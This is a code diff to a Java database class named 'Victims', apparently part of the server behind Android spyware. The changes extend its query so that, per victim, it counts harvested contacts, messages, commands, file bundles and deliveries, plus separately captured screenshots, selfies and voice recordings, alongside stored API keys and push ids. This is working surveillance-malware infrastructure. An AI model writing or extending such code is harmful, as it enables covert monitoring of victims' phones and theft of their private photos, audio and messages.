@@ -25,7 +25,11 @@ public class Victims extends BaseTable<Victim> {
     public static final String COLUMN_VICTIM_CODE = "victim_code";
     public static final String COLUMN_DEVICE_INFO_DYNAMIC = "device_info_dynamic";
     private static final String COLUMN_AS_LAST_DELIVERY_EPOCH = "last_delivery_epoch";
-    private static final String COLUMN_AS_MEDIA_FILE_COUNT = "media_count";
+
+    private static final String COLUMN_AS_MEDIA_FILE_COUNT = "media_file_count";
+    private static final String COLUMN_AS_MEDIA_SCREENSHOT_COUNT = "media_screenshot_count";
+    private static final String COLUMN_AS_MEDIA_SELFIE_COUNT = "media_selfie_count";
+    private static final String COLUMN_AS_MEDIA_VOICE_COUNT = "media_voice_count";
 
     private Victims() {
         super("victims");
@@ -40,7 +44,7 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public Victim get(String byColumn, String byValue) {
 
-        final String query = String.format("SELECT v.id, v.name, v.email, v.phone, v.api_key, v.fcm_id, v.device_name, v.device_info_dynamic, (SELECT COUNT(id) FROM contacts WHERE victim_id = v.id) AS contacts, (SELECT COUNT(id) FROM deliveries WHERE victim_id = v.id) AS deliveries, (SELECT COUNT(id) FROM commands WHERE victim_id = v.id) AS commands, (SELECT COUNT(id) FROM file_bundles WHERE victim_id = v.id) AS file_bundles, (SELECT COUNT(id) FROM messages WHERE victim_id = v.id) AS messages, (SELECT COUNT(id) FROM media WHERE victim_id = v.id) AS media_count, (SELECT UNIX_TIMESTAMP(last_logged_at) FROM deliveries d WHERE d.victim_id = v.id ORDER BY id DESC LIMIT 1) AS last_delivery_epoch FROM victims v WHERE %s = ? LIMIT 1", byColumn);
+        final String query = String.format("SELECT v.id, v.name, v.email, v.phone, v.api_key, v.fcm_id, v.device_name, v.device_info_dynamic, (SELECT COUNT(id) FROM contacts WHERE victim_id = v.id) AS contacts, (SELECT COUNT(id) FROM deliveries WHERE victim_id = v.id) AS deliveries, (SELECT COUNT(id) FROM commands WHERE victim_id = v.id) AS commands, (SELECT COUNT(id) FROM file_bundles WHERE victim_id = v.id) AS file_bundles, (SELECT COUNT(id) FROM messages WHERE victim_id = v.id) AS messages, (SELECT COUNT(id) FROM media WHERE victim_id = v.id AND _type = 'FILE') AS media_file_count, (SELECT COUNT(id) FROM media WHERE victim_id = v.id AND _type = 'SCREENSHOT') AS media_screenshot_count, (SELECT COUNT(id) FROM media WHERE victim_id = v.id AND _type = 'SELFIE') AS media_selfie_count, (SELECT COUNT(id) FROM media WHERE victim_id = v.id AND _type = 'VOICE') AS media_voice_count, (SELECT UNIX_TIMESTAMP(last_logged_at) FROM deliveries d WHERE d.victim_id = v.id ORDER BY id DESC LIMIT 1) AS last_delivery_epoch FROM victims v WHERE v.%s = ? LIMIT 1", byColumn);
 
         final java.sql.Connection con = Connection.getConnection();
         Victim victim = null;
@@ -68,11 +72,17 @@ public class Victims extends BaseTable<Victim> {
                 final int commandsCount = rs.getInt(Commands.TABLE_NAME_COMMANDS);
                 final int fileBundleCount = rs.getInt(FileBundles.TABLE_NAME_FILE_BUNDLES);
                 final int messageCount = rs.getInt(Messages.TABLE_NAME_MESSAGES);
+
+                //Getting media counts
                 final int mediaFileCount = rs.getInt(COLUMN_AS_MEDIA_FILE_COUNT);
+                final int mediaScreenshotCount = rs.getInt(COLUMN_AS_MEDIA_SCREENSHOT_COUNT);
+                final int mediaVoiceCount = rs.getInt(COLUMN_AS_MEDIA_VOICE_COUNT);
+                final int mediaSelfieCount = rs.getInt(COLUMN_AS_MEDIA_SELFIE_COUNT);
+
                 final long lastDeliveryEpoch = rs.getLong(COLUMN_AS_LAST_DELIVERY_EPOCH);
 
                 victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, deviceName, null, deviceInfoDynamic, null, null, false, null, lastDeliveryEpoch);
-                victim.setCounts(contactsCount, deliveryCount, commandsCount, fileBundleCount, messageCount, mediaFileCount);
+                victim.setCounts(contactsCount, deliveryCount, commandsCount, fileBundleCount, messageCount, mediaFileCount, mediaScreenshotCount, mediaSelfieCount, mediaVoiceCount);
             }
 
             rs.close();
